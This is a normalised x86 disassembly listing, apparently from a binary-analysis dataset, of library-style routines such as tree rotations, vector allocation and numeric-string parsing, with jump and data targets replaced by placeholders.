mov eax [ ecx ]
mov ecx esi
mov [ eax + 0x14 ] 0x1
call sub_409a05
mov eax [ ecx + 0x8 ]
push [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x0
call sub_4099b4
mov ecx [ esi ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] 0x1
mov eax [ ecx + 0x8 ]
mov ecx esi
mov [ eax + 0x14 ] 0x1
call sub_4099b4
jmp r-xdata
mov eax [ ecx ]
push [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x0
call sub_409a05
mov ecx [ esi + 0x8 ]
sub_408e5b
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
and [ eax + 0x4 ] 0x0
and [ eax ] 0x0
mov [ edi ] ecx
push esi
mov esi [ edi + 0x4 ]
mov [ edi + 0x4 ] edx
test esi esi
je r-xdata
mov eax edi
pop esi
retn
call sub_40379c
sub_408ed8
push 0x4
mov eax sub_44d5ad
call sub_4485c8
mov edi ecx
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov eax [ edi + 0x4 ]
sub eax [ edi ]
sar eax 0x5
call sub_409ad8
test al al
je r-xdata
mov eax esi
call sub_44866d
retn 0x4
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
mov ecx [ esi ]
mov eax [ edi + 0x4 ]
mov edi [ edi ]
push ecx
push eax
push edi
call sub_40f8de
add esp 0x10
mov [ esi + 0x4 ] eax
sub_408f90
push 0x60
mov eax sub_44d588
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x10 ]
mov esi ecx
push eax
mov [ ebp - 0x64 ] esi
mov ebx edx
call sub_405eb8
mov edi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_405682
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
mov edi [ ebp - 0x60 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x54 ] esi
call sub_40c11d
test al al
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov eax [ ebp + 0xc ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
cmp [ ebx + 0x5 ] 0x2b
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi [ ebp - 0x64 ]
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ esi ] 0x2b
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x5 ] 0x2d
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi [ ebp - 0x64 ]
inc esi
mov [ ebp - 0x54 ] esi
mov esi ebx
call sub_40a392
mov [ ebp - 0x68 ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
mov [ esi ] 0x2d
mov edi [ ebp - 0x54 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x68 ] eax
jmp r-xdata
mov esi ebx
mov [ ebp - 0x58 ] 0x1
call sub_40a392
call sub_40c11d
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
mov al [ ebx + 0x5 ]
mov edi [ ebp - 0x54 ]
push [ ebp - 0x68 ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_4257d0
add esp 0xc
test eax eax
je r-xdata
mov esi ebx
call sub_40a3af
mov esi [ ebp - 0x5c ]
push [ ebp - 0x58 ]
and [ ebp - 0x1c ] 0x0
xor edi edi
inc edi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_4098a0
mov eax [ ebp - 0x64 ]
mov edi [ ebp - 0x60 ]
add eax 0x1f
xor esi esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x6c ] eax
call sub_40c11d
test al al
jne r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov edi eax
test esi esi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
cmp [ ebx + 0x5 ] 0x78
je r-xdata
call sub_40a3af
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x6c ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi ] 0x0
mov [ ebp - 0x4 ] 0x0
call sub_40487c
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40487c
mov eax [ ebp - 0x50 ]
call sub_448681
retn
mov [ edi ] 0x30
inc edi
jmp r-xdata
dec esi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov esi ebx
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_40a392
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
cmp [ ebx + 0x5 ] 0x58
jne r-xdata
mov esi ebx
call sub_40a3af
test esi esi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ eax + esi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + esi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + esi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x4a ]
cmp [ ebx + 0x5 ] al
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi [ ebp - 0x5c ]
mov esi ebx
call sub_40a392
mov edi [ ebp - 0x60 ]
call sub_40c11d
mov esi [ ebp - 0x5c ]
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
jmp r-xdata
inc esi
jmp r-xdata
push 0x0
lea esi [ ebp - 0x2c ]
call sub_405352
inc [ ebp - 0x5c ]
mov edi [ ebp - 0x54 ]
inc [ eax + esi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_4092b7
push 0x64
mov eax sub_44d553
call sub_4485fe
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x64 ] edx
mov edx [ eax + 0x14 ]
mov esi 0x3000
and edx esi
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x58 ] ecx
cmp edx esi
jne r-xdata
lea esi [ ebp - 0x70 ]
call sub_4034a7
and [ ebp - 0x4 ] 0x0
push eax
call sub_405eb8
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ecx esi
mov [ ebp - 0x64 ] eax
call sub_402f60
mov ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_405682
mov [ ebp - 0x50 ] edi
mov edi [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x52 ] 0x0
call sub_40c11d
test al al
jne r-xdata
push eax
push ecx
mov ecx [ ebp - 0x64 ]
push ebx
mov edx edi
call sub_409b73
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
jae r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
call sub_448681
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebx + 0x5 ] 0x2b
jne r-xdata
mov esi ebx
call sub_40a3af
call sub_40c11d
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ eax ] 0x2b
jmp r-xdata
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] cl
jle r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebx + 0x5 ] 0x2d
jne r-xdata
mov esi ebx
call sub_40a3af
inc eax
mov esi ebx
mov [ ebp - 0x50 ] eax
call sub_40a392
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x5 ] 0x30
jl r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x38 ] ecx
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ eax ] 0x2d
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
jne r-xdata
jmp r-xdata
mov al [ ebx + 0x5 ]
mov ecx [ ebp - 0x64 ]
mov [ ebp - 0x51 ] al
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp [ ebp - 0x51 ] al
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x51 ] al
mov [ ebp - 0x51 ] cl
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x64 ] eax
call sub_40c11d
test al al
je r-xdata
call sub_42587d
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov esi ebx
mov [ ecx ] al
call sub_40a392
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x5 ] 0x39
jg r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
xor edi edi
push 0x0
inc edi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_4098a0
mov edi [ ebp - 0x58 ]
xor esi esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x68 ] esi
call sub_40c11d
test al al
jne r-xdata
cmp [ ebp - 0x52 ] 0x0
jne r-xdata
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x5 ] 0x30
jl r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x5c ] 0x24
jl r-xdata
cmp [ ebp - 0x52 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
cmp [ ebx + 0x5 ] 0x30
jl r-xdata
mov esi ebx
call sub_40a3af
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ eax ] 0x30
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_40487c
jmp r-xdata
test esi esi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_40487c
mov eax [ ebp - 0x60 ]
cmp [ ebx + 0x5 ] 0x65
je r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebx + 0x5 ] 0x39
jg r-xdata
mov esi ebx
call sub_40a3af
dec [ ebp - 0x60 ]
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
mov edi [ ebp - 0x58 ]
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x5 ] 0x39
jg r-xdata
mov esi ebx
call sub_40a3af
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov esi ebx
mov [ eax ] 0x65
call sub_40a392
and [ ebp - 0x5c ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x64 ] 0x24
jge r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
dec esi
je r-xdata
mov esi [ ebp - 0x68 ]
test esi esi
je r-xdata
cmp [ ebp - 0x51 ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x5 ] 0x45
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ ebx + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ ecx ] al
mov esi ebx
call sub_40a3af
test esi esi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x5 ] 0x2b
jne r-xdata
call sub_40a3af
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ ebx + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x64 ]
mov [ ecx ] al
mov esi ebx
call sub_40a3af
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + esi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + esi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x51 ]
cmp [ ebx + 0x5 ] al
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x52 ] 0x1
mov [ ebp - 0x52 ] 0x1
inc esi
jmp r-xdata
push 0x0
lea esi [ ebp - 0x2c ]
call sub_405352
inc [ ebp - 0x68 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x5 ] 0x30
jl r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
cmp [ ebx + 0x5 ] 0x2d
jne r-xdata
mov esi ebx
call sub_40a3af
inc [ ebp - 0x50 ]
mov esi ebx
call sub_40a392
mov ecx [ ebp - 0x50 ]
mov al [ ebx + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ ecx ] al
mov esi ebx
call sub_40a3af
mov esi ebx
call sub_40a392
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x5 ] 0x39
jg r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x5c ] 0x8
jge r-xdata
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ ebx + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ ecx ] al
mov esi ebx
call sub_40a3af
sub_409874
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
call sub_40b717
pop edi
mov eax esi
pop esi
leave
retn 0x4
sub_4098a0
push ebp
mov ebp esp
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_40545e
test al al
je r-xdata
push r--data
call sub_446a95
mov eax esi
pop ebp
retn 0x4
mov dl [ ebp + 0x8 ]
push edi
xor ecx ecx
mov eax esi
call sub_40542a
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_40991b
push 0x10
mov eax sub_44d520
call sub_448595
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40a41f
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1c ]
call sub_40a6cf
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
call sub_408b7e
mov eax [ ebp + 0x8 ]
call sub_44866d
retn 0x8
sub_40995a
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_40a6ee
mov eax esi
pop esi
leave
retn
sub_409972
push ebp
mov ebp esp
push ecx
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
push esi
push ecx
push edx
lea esi [ ebp - 0x4 ]
call sub_40a217
pop esi
leave
retn
sub_409993
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_40a744
mov eax esi
pop esi
leave
retn
sub_4099b4
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ edx ] eax
jmp r-xdata
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_409a05
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
jmp r-xdata
mov [ edx ] eax
mov [ edx + 0x8 ] eax
jmp r-xdata
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_409a4a
push ebp
mov ebp esp
push ecx
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
push esi
push ecx
push edx
lea esi [ ebp - 0x4 ]
call sub_40a283
pop esi
leave
retn
sub_409ad8
push edi
mov edi eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x7ffffff
jbe r-xdata
xor al al
pop edi
retn
cmp edi eax
jbe r-xdata
push r--data
call sub_446a95
shl edi 0x5
add edi eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov al 0x1
pop edi
retn
mov eax edi
call sub_40b75e
sub_409b1b
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
retn
push [ esi + 0x4 ]
call sub_40b740
push [ esi ]
call sub_424fc7
pop ecx
pop ecx
sub_409b73
push 0x68
mov eax sub_44d4f1
call sub_4485fe
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov edi edx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x10 ]
lea esi [ ebp - 0x74 ]
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x70 ] ecx
call sub_4034a7
and [ ebp - 0x4 ] 0x0
push eax
call sub_405eb8
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ecx esi
mov [ ebp - 0x6c ] eax
call sub_402f60
mov ecx [ ebp - 0x6c ]
lea eax [ ebp - 0x48 ]
push eax
call sub_405682
mov [ ebp - 0x50 ] edi
mov edi [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x52 ] 0x0
call sub_40c11d
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
and [ ebp - 0x5c ] 0x0
and [ ebp - 0x60 ] 0x0
mov [ eax ] 0x7830
add eax 0x2
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] 0x0
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp [ ebx + 0x5 ] 0x2b
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov esi ebx
call sub_40a392
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x5 ] 0x2d
jne r-xdata
mov esi ebx
call sub_40a3af
inc eax
mov esi ebx
mov [ ebp - 0x50 ] eax
call sub_40a392
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
mov dl [ ebx + 0x5 ]
push 0x41
push 0x61
push 0x30
call sub_40a344
mov edi eax
add esp 0xc
test edi edi
js r-xdata
mov esi ebx
call sub_40a3af
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ ebx + 0x5 ] 0x78
je r-xdata
call sub_40a3af
cmp [ ebp - 0x5c ] 0x24
jl r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x51 ] al
mov [ ebp - 0x51 ] 0x0
jmp r-xdata
mov esi ebx
call sub_40a392
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov edi [ ebp - 0x58 ]
call sub_40c11d
test al al
je r-xdata
jmp r-xdata
mov al [ ebx + 0x5 ]
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x51 ] al
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp [ ebp - 0x51 ] al
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
xor edi edi
push 0x0
inc edi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_4098a0
mov edi [ ebp - 0x58 ]
xor esi esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] esi
call sub_40c11d
test al al
jne r-xdata
cmp [ ebx + 0x5 ] 0x58
jne r-xdata
mov esi ebx
call sub_40a3af
cmp [ ebx + 0x5 ] 0x30
jne r-xdata
mov esi ebx
call sub_40a3af
mov esi ebx
mov [ ebp - 0x49 ] 0x1
call sub_40a392
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
call sub_40c11d
test al al
je r-xdata
call sub_42587d
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov esi ebx
mov [ ecx ] al
call sub_40a392
cmp [ ebp - 0x52 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov dl [ ebx + 0x5 ]
push 0x41
push 0x61
push 0x30
call sub_40a344
mov edi eax
add esp 0xc
test edi edi
js r-xdata
mov esi ebx
call sub_40a3af
mov esi [ ebp - 0x64 ]
